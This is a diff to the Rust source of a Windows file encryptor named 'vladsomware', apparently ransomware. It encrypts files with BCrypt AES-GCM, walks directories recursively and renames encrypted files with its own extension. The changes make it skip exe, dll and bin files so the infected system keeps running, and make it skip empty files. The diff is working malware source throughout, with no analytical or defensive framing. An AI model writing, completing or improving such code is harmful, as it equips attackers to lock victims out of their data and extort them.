@@ -27,10 +27,7 @@ fn make_gcm_info<'a>(
     nonce: &'a [u8],       // 12 bytes
     tag_buf: &'a mut [u8], // output on encrypt, input on decrypt
     aad: Option<&'a [u8]>, // keep None unless you bind a header
-) -> windows::Win32::Security::Cryptography::BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
-    use windows::Win32::Security::Cryptography::{
-        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION,
-    };
+) -> BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
     let mut info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO::default();
     info.cbSize = std::mem::size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32;
     info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
@@ -61,6 +58,7 @@ struct InnerEncryptor {
     encryption_extension: OsString,
     encryption_mode: EncryptionMode,
     recursive: bool,
+    whitelisted_extensions: Vec<OsString>,
 }
 
 impl InnerEncryptor {
@@ -74,6 +72,9 @@ impl InnerEncryptor {
             encryption_extension: OsString::from("vladsomware"),
             encryption_mode: EncryptionMode::Encrypt,
             recursive: false,
+            whitelisted_extensions: vec![OsString::from("exe"),
+                                        OsString::from("dll"),
+                                        OsString::from("bin")],
         })
     }
 
@@ -211,20 +212,26 @@ impl InnerEncryptor {
         fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0 != 0
     }
 
+    fn eq_ignore_ascii_case_os(a: &OsStr, b: &OsStr) -> bool {
+        a.to_string_lossy().eq_ignore_ascii_case(&b.to_string_lossy())
+    }
+
     fn should_skip_dir_entry(&self, fd: &WIN32_FIND_DATAW) -> bool {
-        // Skip dot entries always
         let file_name = name_from_find(fd); // OsString
         if file_name == OsStr::new(".") || file_name == OsStr::new("..") {
             return true;
         }
 
-        // Never skip directories here; recursion decides
         if self.is_directory(&fd) {
             return false;
         }
 
-        // Files: check extension match
         let ext = Path::new(&file_name).extension();               // Option<&OsStr>
+        for ext_to_whitelist in self.whitelisted_extensions.iter() {
+            if Self::eq_ignore_ascii_case_os(ext_to_whitelist, ext.unwrap()) {
+                return true;
+            }
+        }
         let matches = ext == Some(self.encryption_extension.as_os_str());
 
         match self.encryption_mode {
@@ -339,6 +346,10 @@ impl InnerEncryptor {
 
         // header
         let file_size = in_file.metadata()?.len();
+        if file_size == 0 {
+            debug!("file {} is empty, nothing to encrypt", in_path.display());
+            return Ok(());
+        }
         w.write_all(&file_size.to_le_bytes())?;
 
         let base = self.gen_nonce12();
